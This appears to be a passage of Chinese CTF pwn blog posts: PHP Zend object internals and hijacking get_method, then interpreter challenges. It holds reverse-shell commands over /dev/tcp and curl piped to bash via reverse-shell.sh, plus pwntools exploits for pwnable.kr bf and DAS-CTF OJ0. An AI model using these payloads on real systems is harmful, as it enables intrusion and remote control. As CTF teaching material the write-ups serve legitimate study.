<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h  大小0x10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="keyword">uint16_t</span>  call_info;    <span class="comment">/* call info for EX(This) */</span></span><br><span class="line">					<span class="keyword">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> type_info;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>所以class对象的<code>zend_object</code>结构的大小公式为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 + amount_of_member*0x10</span><br></pre></td></tr></table></div></figure>

<p>比如上述的lucky对象的<code>zend_object</code>结构的大小即为<code>48+0x10*2=0x50</code></p>

        <h5 id="③zend-object-handlers"   >
          <a href="#③zend-object-handlers" class="heading-link"><i class="fas fa-link"></i></a><a href="#③zend-object-handlers" class="headerlink" title="③zend_object_handlers"></a>③zend_object_handlers</h5>
      <p>而每个zval结构体中的value值是一个指针，当该成员为字符串时，那么其为一个<code>zend_string</code>结构体指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="keyword">size_t</span>            len;</span><br><span class="line">	<span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>当该成员为函数时，其为一个<code>zend_object_handlers</code>指针</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_object_handlers.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object_handlers</span> &#123;</span></span><br><span class="line">	<span class="comment">/* offset of real object header (usually zero) */</span></span><br><span class="line">	<span class="keyword">int</span>										offset;</span><br><span class="line">	<span class="comment">/* general object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_free_obj_t</span>					free_obj;</span><br><span class="line">	<span class="keyword">zend_object_dtor_obj_t</span>					dtor_obj;</span><br><span class="line">	<span class="keyword">zend_object_clone_obj_t</span>					clone_obj;</span><br><span class="line">	<span class="comment">/* individual object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_read_property_t</span>				read_property;</span><br><span class="line">	<span class="keyword">zend_object_write_property_t</span>			write_property;</span><br><span class="line">	<span class="keyword">zend_object_read_dimension_t</span>			read_dimension;</span><br><span class="line">	<span class="keyword">zend_object_write_dimension_t</span>			write_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_property_ptr_ptr_t</span>		get_property_ptr_ptr;</span><br><span class="line">	<span class="keyword">zend_object_get_t</span>						get;</span><br><span class="line">	<span class="keyword">zend_object_set_t</span>						<span class="built_in">set</span>;</span><br><span class="line">	<span class="keyword">zend_object_has_property_t</span>				has_property;</span><br><span class="line">	<span class="keyword">zend_object_unset_property_t</span>			unset_property;</span><br><span class="line">	<span class="keyword">zend_object_has_dimension_t</span>				has_dimension;</span><br><span class="line">	<span class="keyword">zend_object_unset_dimension_t</span>			unset_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_properties_t</span>			get_properties;</span><br><span class="line">	<span class="keyword">zend_object_get_method_t</span>				get_method;</span><br><span class="line">	<span class="keyword">zend_object_call_method_t</span>				call_method;</span><br><span class="line">	<span class="keyword">zend_object_get_constructor_t</span>			get_constructor;</span><br><span class="line">	<span class="keyword">zend_object_get_class_name_t</span>			get_class_name;</span><br><span class="line">	<span class="keyword">zend_object_compare_t</span>					compare_objects;</span><br><span class="line">	<span class="keyword">zend_object_cast_t</span>						cast_object;</span><br><span class="line">	<span class="keyword">zend_object_count_elements_t</span>			count_elements;</span><br><span class="line">	<span class="keyword">zend_object_get_debug_info_t</span>			get_debug_info;</span><br><span class="line">	<span class="keyword">zend_object_get_closure_t</span>				get_closure;</span><br><span class="line">	<span class="keyword">zend_object_get_gc_t</span>					get_gc;</span><br><span class="line">	<span class="keyword">zend_object_do_operation_t</span>				do_operation;</span><br><span class="line">	<span class="keyword">zend_object_compare_zvals_t</span>				compare;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>同样的，也对应有其他的变量类型，由zval中的type来决定，type值的不同代表不同的类型，比如string为6，函数object为8</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/Zend/zend_types.h</span></span><br><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF					0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL						1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE					2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE						3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG						4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE					5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING					6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY					7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT					8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE					9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE				10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST				11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             	13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR						14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR					15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL					16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE					17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE					18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID						19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_NUMBER					20</span></span><br></pre></td></tr></table></div></figure>

<p>汇总一下，就是创建一个class类，然后劫持其函数成员创建的<code>zval</code>结构体中的<code>zend_object_handlers</code>指针，使其指向我们可控的区域，然后在对应偏移处修改<code>get_method</code>指针，使其指向可以执行系统命令的函数，从而来反弹shell。</p>
<p>或者说直接劫持函数成员创建的<code>zval</code>结构体中的<code>zend_object_handlers</code>指向的内存区域中的<code>get_method</code>指针，也是能起到一样的作用。</p>

        <h4 id="绕过点"   >
          <a href="#绕过点" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过点" class="headerlink" title="绕过点"></a>绕过点</h4>
      <p>不过还是需要绕过一些保护的，调用<code>get_method</code>函数指针貌似还是需要绕过一些东西的，这里不知道具体的原理，不过修改点还是可以说明的</p>

        <h5 id="①write-dimension"   >
          <a href="#①write-dimension" class="heading-link"><i class="fas fa-link"></i></a><a href="#①write-dimension" class="headerlink" title="①write_dimension"></a>①write_dimension</h5>
      <p>这个需要修改的，常见的如下，需要修改最低的为0x1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161908211.png" alt="image-20220216190812859"></p>
<p>相对应的修改如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161909956.png" alt="image-20220216190925728"></p>
<p>相关检测的代码如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161941846.png" alt="image-20220216194142467"></p>

        <h5 id="②get-method的选择"   >
          <a href="#②get-method的选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#②get-method的选择" class="headerlink" title="②get_method的选择"></a>②get_method的选择</h5>
      <p>由于调用该函数指针时，传进来的rdi参数并非是我们的C语言上的字符串类型的指针，而貌似是一个类似<code>zend_string</code>的指针，类似如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161930594.png" alt="image-20220216193001312"></p>
<p>所以不能使用常规意义<code>system</code>或者<code>popen</code>函数等，需要调用php中的相关内置的函数来对参数进行解析再执行。一般选择的是php程序中的<code>php_exec</code>函数下面的函数代码，下图红框所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161914467.png" alt="image-20220216191438382"></p>
<p>同样的，以上的结构体在堆中通常也可以用来泄露地址</p>
<p>例题就是2021WMCTF checkin</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253189#h2-4" >2021WMCTF_checkin学习PHP PWN - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view" >PHP pwn入门1 - 格式化字符串漏洞 - HackMD</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="四、反弹shell"   >
          <a href="#四、反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、反弹shell" class="headerlink" title="四、反弹shell"></a>四、反弹shell</h1>
      <p>常见的反弹shell大概以下两种方式</p>

        <h2 id="1-popen直接反弹"   >
          <a href="#1-popen直接反弹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-popen直接反弹" class="headerlink" title="1.popen直接反弹"></a>1.popen直接反弹</h2>
      <p>这个只需要执行命令，其中<code>127.0.0.1/6666</code>即设置为自己攻击机的ip和端口</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p>常见system函数不好使用，php中不好整的时候</p>

        <h2 id="2-使用中转站反弹"   >
          <a href="#2-使用中转站反弹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-使用中转站反弹" class="headerlink" title="2.使用中转站反弹"></a>2.使用中转站反弹</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/lukechilds/reverse-shell" >GitHub - lukechilds/reverse-shell: Reverse Shell as a Service</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>执行命令，其中<code>192.168.0.69:1337</code>也是设置为自己攻击机的ip和端口</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;curl https://reverse-shell.sh/192.168.0.69:1337|bash\x00&quot;);</span><br></pre></td></tr></table></div></figure>

<p>相当于在一个服务器<code>https://reverse-shell.sh</code>进行中转</p>

        <h1 id="五、调试技巧"   >
          <a href="#五、调试技巧" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、调试技巧" class="headerlink" title="五、调试技巧"></a>五、调试技巧</h1>
      
        <h2 id="1-安装对应版本调试"   >
          <a href="#1-安装对应版本调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装对应版本调试" class="headerlink" title="1.安装对应版本调试"></a>1.安装对应版本调试</h2>
      <p>这个就不多说了，在做题的时候，了解到php版本，然后本机安装对应版本的php，之后在php.ini中添加该模块调试即可</p>

        <h2 id="2-gdbserver调试"   >
          <a href="#2-gdbserver调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gdbserver调试" class="headerlink" title="2.gdbserver调试"></a>2.gdbserver调试</h2>
      <p>有些题目会给现成的docker环境，所以可以直接在里面使用gdbserver调试，但是有点问题就是，调试的时候好像没办法使用<code>run</code>命令来运行php文件，而直接调试<code>php pwn.php</code>的话，开始的时候相应的.so模块不会被加载进入，没办法下断点。</p>
<p>那么可以先将本地的ASLR关闭，这样docker中的ASLR也是关闭状态</p>
<p>然后<code>gdbserver 127.0.0.1:6666 php</code>，宿主机<code>target remote:6666;c</code>远程加载运行起来，找到对应<code>.so</code>模块的加载地址<code>so_addr</code></p>
<p>之后再<code>gdbserver 127.0.0.1:6666 php pwn.php</code>，宿主机远程加载，使用<code>add-symbol-file file.so so_addr</code>从而加载进符号表，然后即可下断点调试了。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/09/%E8%A7%A3%E9%87%8A%E5%99%A8PWN/">解释器PWN</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-02-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p>记录一下解释器类型的PWN题</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208940#h2-2" >解释器类型的Pwn题目总结 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="一、pwnable-bf"   >
          <a href="#一、pwnable-bf" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、pwnable-bf" class="headerlink" title="一、pwnable_bf"></a>一、pwnable_bf</h1>
      <p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Brainfuck"><code>brainfuck</code>语言</a>的解释器，其中指针p指向bss段上的tape</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091059160.png" alt="image-20220209105933118"></p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/216749.html" >Brain fuck-pwnable.kr三种思路详解 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中各个分支（符号代表）的功能，可见下表：（部分来源于<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/53679546#commentsedit" >TaQini</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>）</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="center">操作</th>
<th align="center">含义</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">p += 1</td>
<td align="center">p值加1</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">p -= 1</td>
<td align="center">p值减1</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">(*p) += 1</td>
<td align="center">p值指向的值加1</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">(*p) -= 1</td>
<td align="center">p值指向的值减1</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">putchar(*p)</td>
<td align="center">输出</td>
</tr>
<tr>
<td align="center">,</td>
<td align="center">getchar(*p)</td>
<td align="center">输入</td>
</tr>
</tbody></table></div>
<p>简单来说就是：<code>,.</code>分别控制输入输出；<code>&lt;&gt;</code>控制指针p的取值加减；<code>+-</code>控制指针p指向的内存上的值的加减。</p>
<p>所以这里就很明显，由于没有对p做限制，所以我们可以控制指针p来移动到一个范围内的任意地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091101187.png" alt="image-20220209110158154"></p>
<p>最多移动1024次，也就是在如下范围处</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;tape ± 1024</span><br></pre></td></tr></table></div></figure>

<p>又由于tape在bss段上，距离Got表比较近，并且实际上在IDA中查看也确实如此，那么之后我们就可以借助<code>,</code>来输出got表中内容，泄露地址，然后修改putchar的got表，直接跳转one_gadget即可。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># address</span></span><br><span class="line">tape_addr = <span class="number">0x0804A0A0</span></span><br><span class="line">putchar_addr = <span class="number">0x0804A030</span></span><br><span class="line"><span class="comment"># build payload</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">payload += <span class="string">&#x27;&lt;&#x27;</span> * (tape_addr - putchar_addr) <span class="comment"># move to putchar address(0x0804A030)</span></span><br><span class="line">payload += <span class="string">&#x27;.&#x27;</span> <span class="comment"># load putchar into plt (for the time to use putchar)</span></span><br><span class="line">payload += <span class="string">&#x27;.&gt;&#x27;</span> * <span class="number">0x4</span> <span class="comment"># load putchar real address</span></span><br><span class="line">payload += <span class="string">&#x27;&lt;&#x27;</span> * <span class="number">0x4</span> + <span class="string">&#x27;,&gt;&#x27;</span> * <span class="number">0x4</span> <span class="comment"># overload putchar</span></span><br><span class="line">payload += <span class="string">&#x27;.&#x27;</span> <span class="comment"># getshell</span></span><br><span class="line">log.info(<span class="string">&quot;start send&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9001</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./bf&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome to brainfuck testing system!!\ntype some brainfuck instructions except [ ]\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base_addr = u32Leakbase(libc.sym[<span class="string">&#x27;putchar&#x27;</span>])</span><br><span class="line">p.send(p32(libc_base_addr + <span class="number">0x5fbc6</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>




        <h1 id="二、2020-RCTF-bf"   >
          <a href="#二、2020-RCTF-bf" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、2020-RCTF-bf" class="headerlink" title="二、2020 RCTF bf"></a>二、2020 RCTF bf</h1>
      <p>这题不太想调，也是brainFuck语言的，但是在<code>[]</code>的实现上有点问题，code在栈上，会存在Off-by-one的情况，刚好溢出到code_addr，可通过修改code_addr来控制程序流从而进行ROP。</p>

        <h1 id="三、2020-DAS-CTF-OJ0"   >
          <a href="#三、2020-DAS-CTF-OJ0" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、2020-DAS-CTF-OJ0" class="headerlink" title="三、2020 DAS-CTF OJ0"></a>三、2020 DAS-CTF OJ0</h1>
      <p>C编译器，没有附件，过滤了<code>home</code>、<code>ctf</code>、<code>flag</code>等敏感字符和system，exec类的函数</p>

        <h2 id="解法一：直接读取"   >
          <a href="#解法一：直接读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法一：直接读取" class="headerlink" title="解法一：直接读取"></a>解法一：直接读取</h2>
      <p>通过编写程序读取<code>/home/ctf/flag</code>，绕过过滤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	char buff[128]=&#123;0&#125;, file[128]=&#123;0&#125;;</span></span><br><span class="line"><span class="string">	scanf(&quot;%s&quot;, file);</span></span><br><span class="line"><span class="string">	FILE* fp = fopen(file, &quot;r&quot;);</span></span><br><span class="line"><span class="string">	fscanf(fp, &quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">	printf(&quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">	return 0</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;(Y/n)&quot;</span>, <span class="string">&quot;/home/ctf/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="解法二：拼接读取"   >
          <a href="#解法二：拼接读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#解法二：拼接读取" class="headerlink" title="解法二：拼接读取"></a>解法二：拼接读取</h2>
      <p>由于过滤了，所以可以尝试像Web里面的那种拼接读写</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, 